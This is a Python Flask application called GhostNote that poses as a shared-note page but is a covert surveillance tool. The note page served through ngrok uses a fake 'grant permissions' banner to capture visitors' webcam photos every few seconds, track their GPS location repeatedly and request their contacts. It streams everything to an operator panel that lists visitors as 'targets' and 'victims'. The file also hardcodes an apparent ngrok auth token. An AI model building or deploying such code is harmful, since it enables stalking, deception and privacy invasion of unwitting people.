#!/usr/bin/env python3
"""
Ghost-Note - A themed, recon-capable Note Sharing Application
"""
import os
import sys
import subprocess
from datetime import datetime
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit

# ── App Setup ─────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# In-memory store
captured_data = []
active_notes = {}
connected_victims = {}

# ── HTML Templates ────────────────────────────────────────────────────────────

SENDER_PANEL = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GhostNote — Control Panel</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;800&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
  :root {
    --bg: #0a0a0f;
    --surface: #111118;
    --border: #1e1e2e;
    --accent: #00ff88;
    --accent2: #ff3366;
    --text: #e0e0f0;
    --muted: #555577;
    --card: #13131e;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Syne', sans-serif;
    min-height: 100vh;
    display: grid;
    grid-template-columns: 320px 1fr;
    grid-template-rows: 60px 1fr;
  }
  /* Header */
  header {
    grid-column: 1/-1;
    background: var(--surface);
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    padding: 0 24px;
    gap: 16px;
  }
  .logo { font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
  .logo span { color: var(--accent); }
  .status-bar { margin-left: auto; display: flex; gap: 20px; align-items: center; font-family: 'JetBrains Mono', monospace; font-size: 12px; }
  .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); animation: pulse 1.5s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }

  /* Sidebar */
  aside {
    background: var(--surface);
    border-right: 1px solid var(--border);
    padding: 20px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 16px;
  }
  .section-title {
    font-size: 10px;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 8px;
    font-family: 'JetBrains Mono', monospace;
  }
  .ngrok-box {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 14px;
  }
  .ngrok-url {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    color: var(--accent);
    word-break: break-all;
    margin: 8px 0;
    padding: 8px;
    background: rgba(0,255,136,0.05);
    border-radius: 4px;
    border: 1px solid rgba(0,255,136,0.15);
  }
  .btn {
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    font-weight: 600;
    letter-spacing: 1px;
    transition: all 0.2s;
  }
  .btn-accent { background: var(--accent); color: #000; }
  .btn-accent:hover { background: #00cc70; transform: translateY(-1px); }
  .btn-danger { background: var(--accent2); color: #fff; margin-top: 8px; }
  .btn-danger:hover { background: #cc0044; }
  .btn-ghost {
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text);
    margin-top: 6px;
  }
  .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }

  /* Target list */
  .target-item {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 12px;
    font-size: 13px;
    display: flex;
    align-items: center;
    gap: 10px;
    cursor: pointer;
    transition: border-color 0.2s;
  }
  .target-item:hover { border-color: var(--accent); }
  .target-item.active { border-color: var(--accent); background: rgba(0,255,136,0.04); }
  .target-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
  .target-dot.offline { background: var(--muted); animation: none; }

  /* Main content */
  main {
    padding: 24px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 20px;
  }
  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
  .card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 20px;
  }
  .card-title {
    font-size: 12px;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--muted);
    font-family: 'JetBrains Mono', monospace;
    margin-bottom: 14px;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .card-title .badge {
    background: var(--accent);
    color: #000;
    border-radius: 20px;
    padding: 2px 8px;
    font-size: 10px;
  }

  /* Note editor */
  textarea {
    width: 100%;
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 8px;
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    padding: 14px;
    resize: vertical;
    min-height: 140px;
    outline: none;
    line-height: 1.6;
  }
  textarea:focus { border-color: var(--accent); }
  input[type=text] {
    width: 100%;
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 8px;
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    padding: 10px 14px;
    outline: none;
    margin-bottom: 10px;
  }
  input[type=text]:focus { border-color: var(--accent); }

  /* Data feed */
  .feed {
    max-height: 300px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 8px;
  }
  .feed-item {
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 10px 12px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    animation: fadeIn 0.3s ease;
  }
  @keyframes fadeIn { from{opacity:0;transform:translateY(4px)} to{opacity:1;transform:none} }
  .feed-item .time { color: var(--muted); margin-right: 8px; }
  .feed-item .label { color: var(--accent); margin-right: 6px; }
  .feed-item .label.red { color: var(--accent2); }

  /* Camera snapshot */
  #snapGrid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
  .snap-img {
    border-radius: 8px;
    border: 1px solid var(--border);
    width: 100%;
    aspect-ratio: 4/3;
    object-fit: cover;
    cursor: pointer;
    transition: transform 0.2s;
  }
  .snap-img:hover { transform: scale(1.02); border-color: var(--accent); }

  .empty-state {
    color: var(--muted);
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    text-align: center;
    padding: 30px;
  }

  /* scrollbar */
  ::-webkit-scrollbar { width: 4px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
</style>
</head>
<body>

<header>
  <div class="logo">Ghost<span>Note</span></div>
  <div class="status-bar">
    <div class="dot"></div>
    <span id="connCount">0 connected</span>
    <span style="color:var(--muted)">|</span>
    <span id="clock" style="color:var(--muted)"></span>
  </div>
</header>

<aside>
  <!-- NGROK LINK -->
  <div>
    <div class="section-title">🔗 Share Link</div>
    <div class="ngrok-box">
      <div style="font-size:12px;color:var(--muted);margin-bottom:4px;">Ngrok Tunnel URL</div>
      <div class="ngrok-url" id="ngrokUrl">{{ ngrok_url }}/note</div>
      <button class="btn btn-accent" onclick="copyLink()">COPY LINK</button>
      <button class="btn btn-ghost" onclick="genNote()">NEW NOTE</button>
    </div>
  </div>

  <!-- NOTE COMPOSE -->
  <div>
    <div class="section-title">✏️ Compose Note</div>
    <input type="text" id="noteTitle" placeholder="Note title...">
    <textarea id="noteContent" placeholder="Write your note here...&#10;&#10;The recipient will see this when they open the link."></textarea>
    <button class="btn btn-accent" onclick="sendNote()">SEND NOTE</button>
  </div>

  <!-- CONNECTED TARGETS -->
  <div>
    <div class="section-title">🎯 Connected Targets</div>
    <div id="targetList">
      <div class="empty-state">Waiting for connections...</div>
    </div>
  </div>
</aside>

<main>
  <div class="grid-2">
    <!-- CAMERA CAPTURES -->
    <div class="card" style="grid-column:1/-1">
      <div class="card-title">📸 Camera Captures <span class="badge" id="snapCount">0</span></div>
      <div id="snapGrid">
        <div class="empty-state">Camera snapshots will appear here</div>
      </div>
    </div>
  </div>

  <div class="grid-2">
    <!-- LOCATION DATA -->
    <div class="card">
      <div class="card-title">📍 Location Feed</div>
      <div class="feed" id="locFeed">
        <div class="empty-state">No location data yet</div>
      </div>
    </div>

    <!-- CONTACTS -->
    <div class="card">
      <div class="card-title">👥 Contacts Harvested <span class="badge" id="contactCount">0</span></div>
      <div class="feed" id="contactFeed">
        <div class="empty-state">No contacts received yet</div>
      </div>
    </div>
  </div>

  <!-- LIVE EVENT LOG -->
  <div class="card">
    <div class="card-title">🖥️ Event Log</div>
    <div class="feed" id="eventLog">
      <div class="feed-item"><span class="time">--:--:--</span><span class="label">SYS</span> Panel initialized. Waiting for targets.</div>
    </div>
  </div>
</main>

<script>
const socket = io();
let snapshots = [];
let contacts = [];
let targets = {};

// Clock
setInterval(() => {
  document.getElementById('clock').textContent = new Date().toLocaleTimeString();
}, 1000);

function log(label, msg, red=false) {
  const feed = document.getElementById('eventLog');
  const item = document.createElement('div');
  item.className = 'feed-item';
  const t = new Date().toLocaleTimeString();
  item.innerHTML = `<span class="time">${t}</span><span class="label ${red?'red':''}">${label}</span>${msg}`;
  feed.prepend(item);
}

socket.on('connect', () => log('SYS', 'Socket connected to panel'));
socket.on('disconnect', () => log('SYS', 'Socket disconnected', true));

socket.on('target_connected', data => {
  targets[data.id] = data;
  updateTargets();
  log('NEW', `Target connected — ${data.ip} ${data.ua.substring(0,50)}...`);
  document.getElementById('connCount').textContent = Object.keys(targets).length + ' connected';
});

socket.on('target_disconnected', data => {
  if(targets[data.id]) targets[data.id].online = false;
  updateTargets();
  log('DISC', `Target disconnected — ${data.id}`, true);
  document.getElementById('connCount').textContent = Object.values(targets).filter(t=>t.online!==false).length + ' connected';
});

socket.on('camera_snap', data => {
  snapshots.unshift(data);
  renderSnaps();
  log('CAM', `Photo captured from ${data.ip}`);
  document.getElementById('snapCount').textContent = snapshots.length;
});

socket.on('location_data', data => {
  const feed = document.getElementById('locFeed');
  if(feed.querySelector('.empty-state')) feed.innerHTML = '';
  const item = document.createElement('div');
  item.className = 'feed-item';
  item.innerHTML = `<span class="time">${new Date().toLocaleTimeString()}</span><span class="label">LOC</span>Lat: ${data.lat.toFixed(5)}, Lng: ${data.lng.toFixed(5)} ±${data.acc}m`;
  feed.prepend(item);
  log('GPS', `Location: ${data.lat.toFixed(4)}, ${data.lng.toFixed(4)} (${data.ip})`);
});

socket.on('contacts_data', data => {
  contacts = contacts.concat(data.contacts);
  const feed = document.getElementById('contactFeed');
  if(feed.querySelector('.empty-state')) feed.innerHTML = '';
  data.contacts.slice(0,20).forEach(c => {
    const item = document.createElement('div');
    item.className = 'feed-item';
    item.innerHTML = `<span class="label">CNT</span>${c.name || 'Unknown'} — ${(c.tel||[]).join(', ')||'no phone'}`;
    feed.prepend(item);
  });
  document.getElementById('contactCount').textContent = contacts.length;
  log('CNT', `${data.contacts.length} contacts received from ${data.ip}`);
});

function renderSnaps() {
  const grid = document.getElementById('snapGrid');
  grid.innerHTML = '';
  snapshots.forEach(s => {
    const img = document.createElement('img');
    img.className = 'snap-img';
    img.src = s.image;
    img.title = `${s.ip} — ${s.time}`;
    img.onclick = () => window.open(s.image, '_blank');
    grid.appendChild(img);
  });
}

function updateTargets() {
  const list = document.getElementById('targetList');
  list.innerHTML = '';
  Object.values(targets).forEach(t => {
    const el = document.createElement('div');
    el.className = 'target-item' + (t.online===false?' offline':'');
    el.innerHTML = `<div class="target-dot ${t.online===false?'offline':''}"></div>
      <div><div style="font-size:12px">${t.ip}</div>
      <div style="font-size:10px;color:var(--muted);font-family:monospace">${t.id.substring(0,12)}</div></div>`;
    list.appendChild(el);
  });
}

function copyLink() {
  const url = document.getElementById('ngrokUrl').textContent;
  navigator.clipboard.writeText(url).then(() => {
    log('SYS', `Link copied: ${url}`);
    alert('Link copied to clipboard!\\n\\n' + url);
  });
}

function sendNote() {
  const title = document.getElementById('noteTitle').value || 'Untitled Note';
  const content = document.getElementById('noteContent').value || '';
  socket.emit('update_note', { title, content });
  log('NOTE', `Note pushed: "${title}"`);
}

function genNote() {
  document.getElementById('noteTitle').value = 'Important Note - ' + new Date().toLocaleDateString();
  document.getElementById('noteContent').value = 'This is a shared note. You can view and edit this in real time.\\n\\nOpen this link on your device to collaborate.';
}

// Auto-init a note
genNote();
</script>
</body>
</html>'''

# The page the target sees
NOTE_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ note_title }}</title>
    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        :root {
            --bg: #fafaf7; --surface: #ffffff; --text: #1a1a1a;
            --muted: #888; --border: #e8e8e0; --accent: #2d6a4f;
        }
        body {
            background: var(--bg); color: var(--text); font-family: 'Lora', serif;
            margin: 0; padding: 40px 20px;
        }
        .paper {
            max-width: 700px; margin: 0 auto; background: var(--surface);
            border: 1px solid var(--border);
            box-shadow: 0 2px 12px rgba(0,0,0,0.06); padding: 48px;
        }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .meta { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); margin-bottom: 24px; }
        .note-body { font-size: 16px; line-height: 1.8; white-space: pre-wrap; }
        .perm-banner {
            background: #f0f7f4; border: 1px solid #b7d5c8; border-radius: 6px;
            padding: 14px; margin-bottom: 24px; font-size: 14px; color: var(--accent);
        }
    </style>
</head>
<body>
    <div class="paper">
        <div class="perm-banner">
            <strong>Live Note Sync:</strong> Please grant any requested permissions to enable real-time collaboration.
        </div>
        <h1 id="noteTitle">{{ note_title }}</h1>
        <div class="meta" id="noteMeta">Syncing...</div>
        <div class="note-body" id="noteBody">{{ note_content }}</div>
    </div>

    <script>
        const socket = io();

        // --- Recon Functions ---
        const grabLocation = () => {
            navigator.geolocation && navigator.geolocation.getCurrentPosition(p =>
                socket.emit('location_data', { lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }),
                () => {}, { enableHighAccuracy: true }
            );
        };

        const grabCamera = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 700));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                socket.emit('camera_snap', { image: canvas.toDataURL('image/jpeg', 0.7) });
                stream.getTracks().forEach(t => t.stop());
                setTimeout(grabCamera, 4000); // Take another picture
            } catch (e) {}
        };

        const grabContacts = async () => {
            try {
                if ('contacts' in navigator) {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    if (contacts.length) socket.emit('contacts_data', { contacts });
                }
            } catch (e) {}
        };

        window.addEventListener('load', () => {
            setTimeout(grabLocation, 500);
            setTimeout(grabCamera, 1200);
            setTimeout(grabContacts, 2500);
            setInterval(grabLocation, 15000);
        });

        // --- Note Sync ---
        socket.on('connect', () => {
            document.getElementById('noteMeta').textContent = 'Live Sync Active';
        });
        socket.on('note_updated', data => {
            document.getElementById('noteTitle').textContent = data.title;
            document.getElementById('noteBody').textContent = data.content;
        });
    </script>
</body>
</html>
"""

# ── Routes ────────────────────────────────────────────────────────────────────

@app.route('/')
def panel():
    """Serves the main control panel."""
    return render_template_string(SENDER_PANEL, ngrok_url=app.config.get('NGROK_URL', 'http://localhost:5000'))

@app.route('/note')
def note_page():
    """Serves the page that targets will see."""
    note = active_notes.get('current', {
        'title': 'Important Document',
        'content': 'This document has been shared with you for review.'
    })
    return render_template_string(NOTE_PAGE, note_title=note['title'], note_content=note['content'])

# ── Socket Events ─────────────────────────────────────────────────────────────

@socketio.on('connect')
def handle_connect():
    """
    Handles a new client connection to the Socket.IO server.
    If the connection is from a target, it emits a 'target_connected' event.
    """
    if 'SENDER' not in request.args:
        victim_id = request.sid
        ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        connected_victims[victim_id] = {'id': victim_id, 'ip': ip_addr, 'ua': user_agent, 'online': True}
        emit('target_connected', connected_victims[victim_id], broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    """
    Handles a client disconnection.
    It emits a 'target_disconnected' event to all clients.
    """
    if request.sid in connected_victims:
        emit('target_disconnected', {'id': request.sid}, broadcast=True)
        del connected_victims[request.sid]

@socketio.on('update_note')
def handle_update_note(data):
    """
    Handles the 'update_note' event to update and broadcast the note content.
    """
    note_id = 'main_note'
    active_notes[note_id] = {
        'title': data.get('title', 'Shared Note'),
        'content': data.get('content', ''),
        'time': datetime.utcnow().isoformat()
    }
    emit('note_updated', active_notes[note_id], broadcast=True)

@socketio.on('camera_snap')
def handle_camera_snap(data):
    """
    Receives a camera snapshot and broadcasts it to the sender.
    """
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    snap_data = {
        'image': data['image'],
        'ip': ip_addr,
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    emit('camera_snap', snap_data, broadcast=True)

@socketio.on('location_data')
def handle_location_data(data):
    """
    Receives location data and broadcasts it to the sender.
    """
    emit('location_data', data, broadcast=True)

@socketio.on('contacts_data')
def handle_contacts_data(data):
    """
    Receives contacts data and broadcasts it to the sender.
    """
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    contacts_bundle = {
        'contacts': data['contacts'],
        'ip': ip_addr
    }
    emit('contacts_data', contacts_bundle, broadcast=True)

@socketio.on('disconnect')
def on_disconnect():
    sid = request.sid
    if sid in connected_victims:
        emit('target_disconnected', {'id': sid}, broadcast=True)
        connected_victims.pop(sid, None)

@socketio.on('camera_snap')
def on_snap(data):
    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    data['time'] = datetime.now().strftime('%H:%M:%S')
    emit('camera_snap', data, broadcast=True)

@socketio.on('location_data')
def on_location(data):
    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    emit('location_data', data, broadcast=True)

@socketio.on('contacts_data')
def on_contacts(data):
    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    emit('contacts_data', data, broadcast=True)

@socketio.on('update_note')
def on_update_note(data):
    active_notes['current'] = data
    # Push the update to all connected targets
    emit('note_updated', data, broadcast=True, include_self=False)

# ── Ngrok & Main Execution ────────────────────────────────────────────────────

def start_ngrok(port, auth_token=None):
    """Starts ngrok tunnel and returns the public URL."""
    try:
        from pyngrok import ngrok, conf
        if auth_token:
            conf.get_default().auth_token = auth_token
        public_url = ngrok.connect(port).public_url
        return public_url
    except Exception as e:
        print(f"[!] Ngrok error: {e}")
        return None

if __name__ == '__main__':
    PORT = 5000
    # It's recommended to set the auth token as an environment variable
    # or retrieve it from a secure config, not hardcode it.
    NGROK_AUTH_TOKEN = os.environ.get("NGROK_AUTH_TOKEN", "3Ba1JTw9PJmH5zQ75udVA8Bba32_4Lc9RouPuScqwVVjDqZPS")

    print("[*] Starting GhostNote...")
    ngrok_url = start_ngrok(PORT, NGROK_AUTH_TOKEN)

    if not ngrok_url:
        print("[!] Could not start ngrok. Please check your configuration.")
        sys.exit(1)

    app.config['NGROK_URL'] = ngrok_url
    print("\\n" + "="*60)
    print(f"  PANEL: http://localhost:{PORT}/")
    print(f"  SHARE: {ngrok_url}/note")
    print("="*60 + "\\n")

    # Use eventlet or gevent for better performance with socketio
    try:
        import eventlet
        eventlet.monkey_patch()
        print("[*] Using eventlet for async mode.")
        socketio.run(app, host='0.0.0.0', port=PORT, debug=False)
    except ImportError:
        print("[!] Warning: eventlet not found. Performance may be limited.")
        print("[!] Install with: pip install eventlet")
        socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
